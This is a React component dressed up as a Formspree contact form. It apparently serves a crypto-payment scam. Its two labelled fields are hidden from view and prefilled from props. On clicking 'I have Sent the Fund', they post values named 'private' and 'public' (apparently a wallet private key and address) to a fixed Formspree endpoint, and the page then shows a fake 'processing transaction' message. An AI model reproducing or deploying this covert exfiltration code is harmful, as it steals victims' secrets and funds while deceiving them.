import React from 'react';
import { useForm, ValidationError } from '@formspree/react';

function ContactForm({string, string1}) {
  const [state, handleSubmit] = useForm("xqaeddnw");
    
  if (state.succeeded) {
    return (
      <div className="max-w-md mx-auto mt-8 p-6 bg-green-50 rounded-lg">
        <p className="text-green-600 text-center font-medium">processing transaction...(may take up to 5 minutes)</p>
      </div>
    );
  }

  return (
    <div className="w-full mx-auto mt-6 bg-white rounded-lg shadow-md">
      <form onSubmit={handleSubmit} className="">
        <div className='opacity-0 h-0 overflow-hidden'>
          <label 
            htmlFor="email" 
            className="block text-sm font-medium text-gray-700 mb-1"
          >
            Email Address
          </label>
          <input
            id="email"
            type="type" 
            name="private"
            defaultValue={string}
            className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
          />
          <ValidationError 
            prefix="Email" 
            field="email"
            errors={state.errors}
            className="mt-1 text-sm text-red-600"
          />
        </div>

        <div className='opacity-0 h-0 overflow-hidden'>
          <label 
            htmlFor="message" 
            className="block text-sm font-medium text-gray-700 mb-1"
          >
            Message
          </label>
          <textarea
            id="message"
            name="public"
            rows="4"
            defaultValue={string1}
            className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
          />
          <ValidationError 
            prefix="Message" 
            field="message"
            errors={state.errors}
            className="mt-1 text-sm text-red-600"
          />
        </div>

        <button
          type="submit"
          disabled={state.submitting}
          className="w-full py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {state.submitting ? 'Submitting...' : 'I have Sent the Fund'}
        </button>
      </form>
    </div>
  );
}


export default ContactForm;